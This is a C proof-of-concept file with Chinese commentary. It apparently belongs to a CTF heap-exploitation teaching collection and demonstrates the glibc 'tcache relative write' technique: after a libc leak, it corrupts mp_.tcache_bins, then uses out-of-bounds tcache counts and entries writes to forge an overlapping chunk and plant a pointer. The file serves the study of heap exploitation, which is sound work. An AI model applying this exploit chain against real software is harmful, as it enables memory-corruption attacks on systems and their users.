/*
 * 中文导读（CTF 版）
 *
 * 手法：tcache_relative_write
 * 文件标注范围：2.35 ~ 2.37
 * 模拟漏洞：对 tcache_perthread_struct 发起相对越界写。
 * 核心流程：通过修改计数字段和表头指针，把计数值或 chunk 指针写到堆内相邻的目标位置；
 *   不同版本的差异主要来自 counts 字段宽度、safe-linking 和元数据布局这几处。
 * 成功判据：assert 验证目标字段拿到了预期的相对值；2.42 对 num_slots/entries 的重构
 *   终止了这套依赖旧布局的原语。
 *
 * 阅读约定：malloc 返回的是 user data；源码里 p[-1] 通常是 size，p[-2]
 * 是 prev_size。所有故意的 UAF、越界和 double free 都是漏洞模拟，不是正常 C 用法。
 * 版本范围以本目录 README 和验证矩阵为准；发行版回移补丁时应按实际 libc 源码判断。
 */

#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <malloc.h>

int main(void)
{
    /*
     * 本文件演示 TCache Relative Write。参考资料：
     * https://d4r30.github.io/heap-exploit/2025/11/25/tcache-relative-write.html
     *
     * 2.30~2.41 的 tcache_put/tcache_get 用 tc_idx 去索引
     * tcache_perthread_struct 里的 counts 和 entries 两个数组，正常情况下
     * 索引的上界来自 mp_.tcache_bins。如果能先把 mp_.tcache_bins 改成大于
     * 64 的巨大数值，再释放一个超过常规 tcache 最大尺寸的 chunk，那么这个
     * 越界的 tc_idx 仍会被当作合法索引接受，于是 counts[tc_idx] 和
     * entries[tc_idx] 的更新就会越过元数据结构本身，落到结构体之后的堆
     * 地址上。也就是说，选择申请的尺寸，等价于选择了这次相对写入的偏移量。
     *
     * 由此可以得到两类输出原语：
     * - 对 counts 的自增/自减操作，可以向堆上的相对目标写入 0~7 之间的值；
     *   如果还能同时放大 mp_.tcache_count，反复收发就能把这个写扩展成范围
     *   更大的半任意整数写；
     * - 对 entries 的更新，可以把一个被释放 chunk 的指针写到堆上的相对
     *   目标位置，之后还能继续接上 tcache poisoning、fastbin corruption、
     *   House of Lore，或者用来做堆地址泄漏。
     *
     * 需要具备的前提条件：
     * - 一次 UAF 或堆溢出之类的能力，足以把大于 64 的值写进 mp_.tcache_bins；
     * - 一次 libc 泄漏，用来定位 malloc_par 结构体中 mp_.tcache_bins 的地址；
     * - 能申请并释放一个精确尺寸的 chunk，其大小要高于正常 tcache 上限 0x408。
     *
     * safe-linking 只是改变了 entries 中链表指针的编码方式,并不能阻止“越界
     * 索引写”这个手法背后的根本思路。glibc 2.42 把 counts 的语义改成了
     * num_slots，并重新排布了 entries，导致这里推导出的公式和收发副作用都
     * 不再成立。原 PoC 作者：D4R30（Mahdyar Bahrami）。
     */

    setbuf(stdout, NULL);

    unsigned long *p1 = malloc(0x410);	// 可被溢出或 UAF 的来源块；它的 unsorted fd 之后还会用来定位 libc。
    unsigned long *p2 = malloc(0x100);	// 相邻的目标块；后面会先演示把它的 size 改大，制造重叠。
    size_t p2_orig_size = p2[-1];

    free(p1);	// 0x420 的物理尺寸超过正常 tcache 上限，会进入 unsorted bin，并在 p1[0] 留下 libc 指针。

    /* 漏洞模拟开始/结束 */

    // 第一步：向 mp_.tcache_bins 写入一个巨大的值，解除 tc_idx 的正常上界。
    // 这里并不需要完整的任意写能力，只要能把一个大于 64 的非零值写进这个字段就够了。
    // 真实题目里可以借助程序自身逻辑，也可以把 UAF/溢出跟 largebin attack、
    // fastbin_reverse_into_tcache、House of Mind 的 fastbin 变体等原语组合起来实现。

    unsigned long *mp_tcache_bins = (void*)p1[0] - 0x918;   // 从 unsorted bin 里的 main_arena 指针，按本版本的偏移反算出 &mp_.tcache_bins。

    *mp_tcache_bins = 0x7fffffffffff;	// 把合法的 tcache bin 数量从 64 伪造成一个巨值，让越界的 tc_idx 也能通过检查。

    // 如果还能同时放大 mp_.tcache_count，反复收发就可以把这里扩展成更强的整数写；
    // 只单独修改 mp_.tcache_bins 的话，每个 bin 默认容量是 7，目标计数值通常只能落在 0~7 之间。

    /* 漏洞模拟结束：从这里开始，只通过正常的 malloc/free 去消费被修改过的全局参数。 */

    /*
     * 接下来要反算出精确的 tc_idx，让 tcache_put 对 counts[tc_idx] 和
     * entries[tc_idx] 的写入正好越过 tcache_perthread_struct，命中我们想要
     * 的目标。tc_idx 是由本次请求对应的内部 chunk size 决定的，所以攻击者
     * 可以通过选择 malloc 的尺寸来选择这次写入的相对偏移。唯一的索引上界
     * tc_idx < mp_.tcache_bins 已经在第一步里被绕过了。
     */

    // 第二步：根据目标位置与 tcache 元数据之间的相对距离，计算出需要申请再释放的 chunk size。
    /*
     * 设 nb 为 free 时对应的内部 chunk size。x86-64 上
     * MALLOC_ALIGNMENT=0x10、MINSIZE=0x20，相关宏换算下来就是：
     *
     *     索引公式：csize2tidx(nb) = (nb - MINSIZE + 0xf) / 0x10；
     *     由于是整数除法，可以简化写成 tc_idx = (nb-16)/16 - 1。
     *
     * 所以 nb=0x20 对应索引 0，nb=0x30 对应索引 1，之后每增加 0x10，
     * tc_idx 就增加 1。再结合数组元素本身的宽度，可以进一步得到：
     *
     *     entries 写入地址 = entries 起点 + (nb-16)/2 - 8；
     *     counts  写入地址 = counts  起点 + (nb-16)/8 - 2。
     *
     * 如果目标位置与对应数组起点之间的字节差是 delta，反解上面两式就得到：
     *
     *     指针类相对写：nb = 2*(delta+8)+16；
     *     计数类相对写：nb = 8*(delta+2)+16。
     *
     * 这里只需要知道相对距离，并不需要 tcache_perthread_struct 的绝对堆
     * 地址。举例来说，如果目标 counts 半字位于 counts 起点之后 0x6a8 处，
     * 那么 ASLR 只会改变两者共同的基址，delta=0x6a8 这个值本身不受影响，
     * 所以这部分推导并不额外要求一次堆地址泄漏。
     */

    // 第三步：把相对计数写和相对指针写这两类能力，各组合成一个直观的高层利用原语。
    // 本 PoC 选了“放大 p2 的 size 形成重叠块”和“向 p1->fd 写入被释放 chunk 的指针”
    // 两个例子来演示，但它们并不是唯一的终点：重复释放/取出可以累计计数值,指针写
    // 还能继续接上 tcache poisoning、fastbin corruption、House of Lore 等手法。

    // 示例一：用 counts 的相对写破坏 p2 的 size 字段，制造出一个大尺寸的重叠块。
    // 目标是让一次 counts[tc_idx] 的更新正好落在 p2 的 size 字段上；先算出该字段
    // 与 tcache counts 起点之间的 delta，再代入当前版本的反算公式得到 nb。

    void *tcache_counts = (void*)p1 - 0x290; 	// 根据首批固定的堆布局，回退定位到 tcache->counts 的起点。
    unsigned long delta = ((void*)p2 - 6) - tcache_counts;

    // 2.30~2.41 的 counts 元素宽度是 2 字节，代入指针运算可得 nb = 8*(delta+2)+16。
    unsigned long nb = 8*(delta+2)+16;

    // 申请用户尺寸 nb-0x10，让内部 chunk size 正好等于 nb，释放时正好命中目标计数地址。
    unsigned long *p = malloc(nb-0x10);

    // free 会调用 tcache_put，越界的 counts[tc_idx] 自增，从而改写 p2 的 size 字段。
    free(p);

    // 严格断言 p2 的 size 已经大于原值，排除只是完成了一次普通释放的假阳性情况。
    assert(p2[-1] > p2_orig_size);

    // 按被放大之后的 size 释放 p2，再用一个远大于原始 0x100 的请求把同一块地址取回来。
    free(p2);
    p = malloc(0x10100);

    // 返回的地址必须精确等于 p2，这样才能证明重叠块原语确实成立。
    assert(p == p2);

    // 示例二：让 entries 的相对写，把一个被释放 chunk 的指针写到堆上任意的相对位置。
    // 这类指针写可以直接当作后续 tcache poisoning、fastbin corruption 或
    // House of Lore 链表构造的基础。

    // 计算 p1->fd 这个目标与 tcache->entries 起点之间的相对距离 delta。
    void *tcache_entries = (void*)p1 - 0x210;  // 按固定的首批堆布局，回退定位到 tcache->entries 的起点。
    delta = (void*)p1 - tcache_entries;

    // entries 元素宽度是 8 字节，按前面推导的公式反算得到 nb = 2*(delta+8)+16。
    nb = 2*(delta+8)+16;

    p = malloc(nb-0x10);

    // 释放 p 的时候，越界的 entries[tc_idx] 更新应该把 p 的链表值写进 p1->fd。

    free(p);

    assert(p1[0] == (unsigned long)p);

    // 至此就拿到了相对的 chunk 指针写；后面可以继续组合 tcache poisoning、低版本的
    // fastbin corruption，或者 House of Lore。
}
